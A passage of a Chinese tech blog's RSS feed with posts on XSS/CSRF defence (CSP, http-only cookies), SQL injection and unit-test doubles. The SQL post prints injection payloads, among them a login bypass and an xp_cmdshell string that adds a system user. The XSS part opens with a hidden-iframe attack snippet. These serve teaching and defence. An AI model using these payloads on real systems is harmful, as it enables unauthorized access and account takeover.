&lt;span style="color:#a6e22e">hideFrame&lt;/span>.&lt;span style="color:#a6e22e">width&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;span style="color:#a6e22e">hideFrame&lt;/span>.&lt;span style="color:#a6e22e">style&lt;/span>.&lt;span style="color:#a6e22e">display&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;none&amp;#34;&lt;/span>;
&lt;span style="color:#a6e22e">hideFrame&lt;/span>.&lt;span style="color:#a6e22e">src&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">xssURI&lt;/span>;
&lt;span style="color:#75715e">// 开工
&lt;/span>&lt;span style="color:#75715e">&lt;/span> document.&lt;span style="color:#a6e22e">body&lt;/span>.&lt;span style="color:#a6e22e">appendChild&lt;/span>(&lt;span style="color:#a6e22e">hideFrame&lt;/span>);
})(window, document);
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="如何避免-xss-攻击">如何避免 XSS 攻击&lt;/h2>
&lt;ol>
&lt;li>对于任何用户输入的信息，入库之前都要进行转义。&lt;/li>
&lt;li>使用浏览器自带的 xss filter
&lt;blockquote>
&lt;p>现代浏览器都对反射型 xss 有一定的防御力，其原理是检查 url 和 dom 中元素的相关性。但这并不能完全防止反射型 xss。另外，浏览器对于存储型 xss 并没有抵抗力，原因很简单，用户的需求是多种多样的。所以，抵御 xss 这件事情不能指望浏览器。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>CSP(Content Security Policy)
&lt;blockquote>
&lt;p>从原理上说防止 xss 是很简单的一件事，但实际中，业务代码非常多样和复杂，漏洞还是会出现。 CSP 并不是用来防止 xss 攻击的，但可以最小化 xss 发生后所造成的伤害。事实上，除了开发者自己做好 xss 转义，并没有别的方法可以防止 xss 的发生。CSP 可以说是 html5 给 web 安全带来的最实惠的东西。&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;/ol>
&lt;p>综上所述，CSP 的作用是限制一个页面的行为是否是受 javascript 控制的。那么如何引入 CSP 呢？
假设现在需要完成一个只允许脚本从本源加载资源的设置，则有两种方式。&lt;/p>
&lt;p>&lt;strong>通过 response 头&lt;/strong>
&lt;code>Content-Security-Policy: script-src ‘self’&lt;/code>
&lt;strong>通过 HTML 的 META 标签&lt;/strong>
&lt;code>&amp;lt;meta http-equiv=”Content-Security-Policy” content=”script-src ‘self'”&amp;gt;&lt;/code>
&lt;strong>CSP 策略常用限制功能&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>base-uri : 限制这篇文档的uri
child-src ：限制子窗口的源(iframe,弹窗等),取代frame-src
connect-src ：限制脚本可以访问的源
font-src : 限制字体的源
form-action : 限制表单能够提交到的源
frame-ancestors : 限制了当前页面可以被哪些页面以iframe,frame,object等方式加载
frame-src ：deprecated with child-src,限制了当前页面可以加载哪些源，与frame-ancestors对应
img-src : 限制图片可以从哪些源加载
media-src : 限制video, audio, source, track 能够从哪些源加载
object-src ：限制插件可以从哪些源加载
sandbox ：强制打开沙盒模式
&lt;/code>&lt;/pre>&lt;p>CSP 是一个强大的策略，几乎可以限制所有能够用到的资源的来源。使用好 CSP 可以很大程度降低 XSS 带来的风险
CSP 目前有两版，CSP1 和 CSP2， 两版的支持状态可以在 &lt;a href="http://caniuse.com/#search=csp">http://caniuse.com/#search=csp&lt;/a> 中查到。&lt;/p>
&lt;ol start="4">
&lt;li>Http-Only
使用 http-only 保护 cookie。可以保证即使发生了 xss，用户的 cookie 也是安全的。使用 http-only 保护的 cookie 是不会被 javascript 读写的。所以无论是客户端还是服务端的 XSS 攻击，都无法通过 js 获取到用户的 cookie 信息。&lt;/li>
&lt;/ol>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>XSS 与 CSRF 攻击都是属于高危攻击手段。即使是在现代浏览器、同源策略以及 html5 的强大防线下，他们依然能够对 web 应用产生巨大的危害。
在开发 web 应用时，应该合理利用 http-only、CSP 策略、以及用户输入信息转义，能够将 XSS 与 CSRF 的风险降到最低。&lt;/p>
&lt;hr>
&lt;p>参考链接&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md">避免 SQL 注入&lt;/a>, by wuyuanwei&lt;/li>
&lt;li>&lt;a href="http://liuwanlin.info/webgong-ji-yu-fang-hu/">Web 攻击与防护&lt;/a>, by liuwulin&lt;/li>
&lt;li>&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">浏览器的同源策略&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/">总结 XSS 与 CSRF 两种跨站攻击&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">XSS 攻击入门&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.wilddog.com/?p=290">关于 Web 安全，99%的网站都忽略了这些&lt;/a>, by wilddog&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/developerworks/cn/web/se-appscan-detect-csrf-xsrf/">预防跨站点请求伪造：了解浏览器选项卡中的隐藏危险&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.importnew.com/5839.html">CSRF 攻击的应对之道&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>SQL 注入</title><link>https://www.chucklin.net/post/sql_inject/</link><pubDate>Wed, 29 Jan 2020 09:51:00 +0800</pubDate><guid>https://www.chucklin.net/post/sql_inject/</guid><description>&lt;h2 id="什么是-sql-注入">什么是 SQL 注入&lt;/h2>
&lt;p>SQL 注入攻击（SQL Injection），简称注入攻击，是 Web 开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。&lt;/p>
&lt;p>而造成 SQL 注入的原因是因为程序没有有效过滤用户的输入，使攻击者成功的向服务器提交恶意的 SQL 查询代码，程序在接收后错误的将攻击者的输入作为查询语句的一部分执行，导致原始的查询逻辑被改变，额外的执行了攻击者精心构造的恶意代码。&lt;/p>
&lt;h2 id="sql-注入实例">SQL 注入实例&lt;/h2>
&lt;p>很多 Web 开发者没有意识到 SQL 查询是可以被篡改的，从而把 SQL 查询当作可信任的命令。殊不知，SQL 查询是可以绕开访问控制，从而绕过身份验证和权限检查的。更有甚者，有可能通过 SQL 查询去运行主机系统级的命令。&lt;/p>
&lt;p>下面将通过一些真实的例子来详细讲解 SQL 注入的方式。&lt;/p>
&lt;p>考虑以下简单的登录表单：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;form action=&amp;quot;/login&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;
&amp;lt;p&amp;gt;Username: &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;username&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;Password: &amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;password&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;登陆&amp;quot; /&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;/form&amp;gt;
&lt;/code>&lt;/pre>&lt;p>我们的处理里面的 SQL 可能是这样的：&lt;/p>
&lt;pre tabindex="0">&lt;code>username:=r.Form.Get(&amp;quot;username&amp;quot;)
password:=r.Form.Get(&amp;quot;password&amp;quot;)
sql:=&amp;quot;SELECT * FROM user WHERE username='&amp;quot;+username+&amp;quot;' AND password='&amp;quot;+password+&amp;quot;'&amp;quot;
&lt;/code>&lt;/pre>&lt;p>如果用户的输入的用户名如下，密码任意&lt;/p>
&lt;pre tabindex="0">&lt;code>myuser' or 'foo' = 'foo' --
&lt;/code>&lt;/pre>&lt;p>那么我们的 SQL 变成了如下所示：&lt;/p>
&lt;pre tabindex="0">&lt;code>SELECT * FROM user WHERE username='myuser' or 'foo' = 'foo' --'' AND password='xxx'
&lt;/code>&lt;/pre>&lt;p>在 SQL 里面&amp;ndash;是注释标记，所以查询语句会在此中断。这就让攻击者在不知道任何合法用户名和密码的情况下成功登录了。&lt;/p>
&lt;p>对于 MSSQL 还有更加危险的一种 SQL 注入，就是控制系统，下面这个可怕的例子将演示如何在某些版本的 MSSQL 数据库上执行系统命令。&lt;/p>
&lt;pre tabindex="0">&lt;code>sql:=&amp;quot;SELECT * FROM products WHERE name LIKE '%&amp;quot;+prod+&amp;quot;%'&amp;quot;
Db.Exec(sql)
&lt;/code>&lt;/pre>&lt;p>如果攻击提交「a%' exec master..xp_cmdshell &amp;lsquo;net user test testpass /ADD&amp;rsquo; &amp;ndash;」作为变量 prod 的值，那么 sql 将会变成&lt;/p>
&lt;pre tabindex="0">&lt;code>sql:=&amp;quot;SELECT * FROM products WHERE name LIKE '%a%' exec master..xp_cmdshell 'net user test testpass /ADD'--%'&amp;quot;
&lt;/code>&lt;/pre>&lt;p>MSSQL 服务器会执行这条 SQL 语句，包括它后面那个用于向系统添加新用户的命令。如果这个程序是以 sa 运行而 MSSQLSERVER 服务又有足够的权限的话，攻击者就可以获得一个系统帐号来访问主机了。&lt;/p>
&lt;p>虽然以上的例子是针对某一特定的数据库系统的，但是这并不代表不能对其它数据库系统实施类似的攻击。针对这种安全漏洞，只要使用不同方法，各种数据库都有可能遭殃。&lt;/p>
&lt;h2 id="如何预防-sql-注入">如何预防 SQL 注入&lt;/h2>
&lt;p>也许你会说攻击者要知道数据库结构的信息才能实施 SQL 注入攻击。确实如此，但没人能保证攻击者一定拿不到这些信息，一旦他们拿到了，数据库就存在泄露的危险。如果你在用开放源代码的软件包来访问数据库，比如论坛程序，攻击者就很容易得到相关的代码。如果这些代码设计不良的话，风险就更大了。目前 Discuz、phpwind、phpcms 等这些流行的开源程序都有被 SQL 注入攻击的先例。
这些攻击总是发生在安全性不高的代码上。所以，永远不要信任外界输入的数据，特别是来自于用户的数据，包括选择框、表单隐藏域和 cookie。就如上面的第一个例子那样，就算是正常的查询也有可能造成灾难。&lt;/p>
&lt;p>SQL 注入攻击的危害这么大，那么该如何来防治呢?下面这些建议或许对防治 SQL 注入有一定的帮助。&lt;/p>
&lt;ol>
&lt;li>严格限制 Web 应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。&lt;/li>
&lt;li>检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用 regexp 包进行一些匹配处理，或者使用 strconv 包对字符串转化成其他基本类型的数据进行判断。&lt;/li>
&lt;li>对进入数据库的特殊字符（'&amp;quot;\尖括号&amp;amp;*;等）进行转义处理，或编码转换。Go 的 text/template 包里面的 HTMLEscapeString 函数可以对字符串进行转义处理。&lt;/li>
&lt;li>所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如使用 database/sql 里面的查询函数 Prepare 和 Query，或者&lt;/li>
&lt;/ol>
&lt;p>&lt;code>Exec(query string, args ...interface{})&lt;/code>&lt;/p>
&lt;p>也就是我们常说的「使用预编译语句 」例如如下句子，可以有效防止注入漏洞：&lt;/p>
&lt;p>&lt;code>select * from user where nick = ? and pwd = ?&lt;/code>&lt;/p>
&lt;ol start="5">
&lt;li>在应用发布之前建议使用专业的 SQL 注入检测工具进行检测，以及时修补被发现的 SQL 注入漏洞。网上有很多这方面的开源工具，例如 sqlmap、SQLninja 等。&lt;/li>
&lt;li>避免网站打印出 SQL 错误信息，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露 出来，以防止攻击者利用这些错误信息进行 SQL 注入。&lt;/li>
&lt;/ol>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>通过上面的示例我们可以知道，SQL 注入是危害相当大的安全漏洞。所以对于我们平常编写的 Web 应用，应该对于每一个小细节都要非常重视，细节决定命运，生活如此，编写 Web 应用也是这样。&lt;/p>
&lt;hr>
&lt;p>参考链接&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.4.md">避免 SQL 注入&lt;/a>, by wuyuanwei&lt;/li>
&lt;li>&lt;a href="http://liuwanlin.info/webgong-ji-yu-fang-hu/">Web 攻击与防护&lt;/a>, by liuwulin&lt;/li>
&lt;li>&lt;a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">浏览器的同源策略&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/">总结 XSS 与 CSRF 两种跨站攻击&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html">XSS 攻击入门&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://blog.wilddog.com/?p=290">关于 Web 安全，99%的网站都忽略了这些&lt;/a>, by wilddog&lt;/li>
&lt;li>&lt;a href="https://www.ibm.com/developerworks/cn/web/se-appscan-detect-csrf-xsrf/">预防跨站点请求伪造：了解浏览器选项卡中的隐藏危险&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.importnew.com/5839.html">CSRF 攻击的应对之道&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>什么是优秀的测试？</title><link>https://www.chucklin.net/post/goodtest/</link><pubDate>Wed, 29 Jan 2020 09:51:00 +0800</pubDate><guid>https://www.chucklin.net/post/goodtest/</guid><description>&lt;h2 id="单元测试的质量意义">单元测试的质量意义&lt;/h2>
&lt;p>合理编写单元测试，可使团队工程师告别牛仔式编程，产出易维护的高质量代码。随着单元测试覆盖率的上升，项目会更加的健壮，团队的信心满满，充满斗志。无论是瀑布团队还是敏捷团队，单元测试及自动化单元测试作为重要的质量保证手段的价值已经被大家接纳与认可。&lt;/p>
&lt;p>但是，对于大多数团队来讲当测试覆盖率提升一定阶段后，收益会迎来瓶颈。&lt;/p>
&lt;h2 id="单元测试的设计意义">单元测试的设计意义&lt;/h2>
&lt;p>单元测试除了作为质量保证手段以外，更应该作为设计手段。TDD 的核心思想之一，就是使用单元测试作为设计手段，使开发者在编写测试用例时，以调用者的思维方式来写代码，这种方式的收益会比作为保护手段更高。
利用测试驱动开发可以让你的设计更加优良、编写出可测试的代码、还能避免在不切实际的假设上过度设计系统。&lt;/p>
&lt;h2 id="优秀测试的共性">优秀测试的共性&lt;/h2>
&lt;ol>
&lt;li>良好的测试代码具备可读性和可维护性。&lt;/li>
&lt;li>测试代码在项目中有结构化的组织方式。&lt;/li>
&lt;li>测试具备可靠性和可重复性。&lt;/li>
&lt;li>合理的使用测试替身。&lt;/li>
&lt;li>AAA(Arrange, Act &amp;amp; Assert)——准备、执行、断言。 编写测试代码时，使用被称为三A模型：准备、执行、断言。&lt;/li>
&lt;/ol>
&lt;h2 id="测试替身test-double">测试替身（test double）&lt;/h2>
&lt;p>为了方便的测试代码以及绕开各种环境限制，应该使用替身来代替真实对象。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Car&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 对外封闭的引擎对象。你无法知道内在信息。
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> Engine engine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#a6e22e">Car&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Engine engine&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">engine&lt;/span> &lt;span style="color:#f92672">=&lt;/span> engine&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// 需要测试的启动功能
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
engine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// 需要测试汽车的驾驶功能
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">drive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Route route&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 根据路线状态获取提供给 car 使用的各种方向 (十分复杂的算法，初始化时需要涉及 gis 算法。最终获取的对对象与当前的时间有关）
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Directions directions &lt;span style="color:#f92672">:&lt;/span> route&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDirections&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
directions&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">follow&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>为了验证一段代码的行为符合你的期望，最好的选择是替换其周围的代码，使你获得对环境的完整控制。使用了替身，能让执行速度变得更快，并且可以随意模拟特殊情况。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TestRoute&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Route &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 伪造的替身实现了快速返回路线以及返回固定路线的方法，使测试具备了可靠与可重复性
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Directions&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">getDirections&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;快速的返回固定的路线&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&lt;/span>Directions&lt;span style="color:#f92672">&amp;gt;();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TestEngine&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Engine &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> engineFlg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
engineFlg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">stop&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
engineFlg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">isEngineFlg&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> engineFlg&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setEngineFlg&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">boolean&lt;/span> engineFlg&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">engineFlg&lt;/span> &lt;span style="color:#f92672">=&lt;/span> engineFlg&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用替身替换协作者，隔离被测代码意味着将需要测试的代码与其他代码隔离开来。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">testCarStart&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
TestEngine engine &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TestEngine&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span> Car&lt;span style="color:#f92672">(&lt;/span>engine&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
assertTrue&lt;span style="color:#f92672">(&lt;/span>engine&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEngineFlg&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Test&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">testCarDrive&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
TestRoute testRoute &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TestRoute&lt;span style="color:#f92672">();&lt;/span>
TestEngine engine &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TestEngine&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span> Car&lt;span style="color:#f92672">(&lt;/span>engine&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">drive&lt;/span>&lt;span style="color:#f92672">(&lt;/span>testRoute&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="测试替身的类型">测试替身的类型&lt;/h3>
&lt;p>替身拥有多种类型。不同的测试场景选择合理的测试替身是优秀测试的必要条件之一。测试替身的类型也决定了测试类的命名方法，尤其特别注意。&lt;/p>
&lt;h4 id="桩stub">桩（stub）&lt;/h4>
&lt;p>用最简单的可能实现来代替真实实现。桩总是短小的。最好的例子就是一个对象的所有方法都只有一行，并且返回一个默认值。&lt;/p>
&lt;pre tabindex="0">&lt;code>public class LoggerStub implements Logger {
@Override
public void log() {
// Nope
}
}
&lt;/code>&lt;/pre>&lt;h4 id="伪造对象-fake">伪造对象 （fake）&lt;/h4>
&lt;p>有时，我们至少需要填充一些行为，而有时候你需要测试替身根据收到的消息种类来表现出不同的行为。
Fake 就像是真实事物的简单版本，他能够伪造真实事物的行为，具备简单的业务逻辑，同时没有副作用或者使用真实事物的其他后果。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TestRoute&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Route &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 伪造的替身实现了快速返回路线以及返回固定路线的方法，使测试具备了可靠与可重复性
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> List&lt;span style="color:#f92672">&amp;lt;&lt;/span>Directions&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">getDirections&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;快速的返回固定的路线&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&lt;/span>Directions&lt;span style="color:#f92672">&amp;gt;();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>伪造对象与测试桩十分常用，你可以在测试时用它们替换掉缓慢的真实事物，以及鞭长莫及的依赖。&lt;/p>
&lt;h4 id="测试间谍-spy">测试间谍 (spy)&lt;/h4>
&lt;p>测试间谍用于记录你和某个不对你开放的对象之间的交互。当对象与协作者之间交互时，无法获取协作者交互结果的情况下，会使用测试间谍。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">// 测试间谍
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TestEngine&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> Engine &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// 对外暴露信息
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> engineFlg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">// 比真实对象的 start 方法更具有交互性的方法。
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">start&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
engineFlg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">stop&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
engineFlg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// 对外提供用于获取交互结果的接口，用于断言。
